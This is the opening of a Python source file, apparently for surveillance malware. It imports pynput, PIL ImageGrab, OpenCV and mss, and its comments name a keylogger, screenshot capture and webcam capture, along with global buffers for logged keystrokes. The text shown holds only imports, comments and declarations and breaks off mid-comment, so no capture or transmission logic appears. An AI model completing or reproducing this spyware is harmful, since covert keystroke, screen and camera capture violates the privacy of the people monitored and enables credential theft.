import ctypes
import ctypes.util
import threading
import sqlite3
import datetime
import os
import sys
import time

# The following are the libraries needed for the lirc.py file.
# The lirc.py file was pulled from the py-lirc project and modified
# to work with Python 3.7
from lirc import *

# The following libraries are needed for the keylogger.
from pynput import keyboard
from pynput.keyboard import Key, Listener

# The following libraries are needed for the screenshot.
from PIL import ImageGrab

# The following are the libraries needed for the web_cam.
import cv2
import numpy
from mss import mss


# The following is the global variables for the keylogger.
# The global variables are used to hold the keystrokes as they are typed.
# The keystrokes are written to the files and then cleared for the next
# set of keystrokes.
global key_logs
global key_logs_file
global key_logs_file_name

# The following is the global variables for the screenshots.
# The global variables are used to hold the screenshots as
